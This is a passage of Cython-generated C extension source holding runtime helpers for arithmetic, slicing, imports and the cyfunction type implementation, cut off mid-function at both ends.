            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* None */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
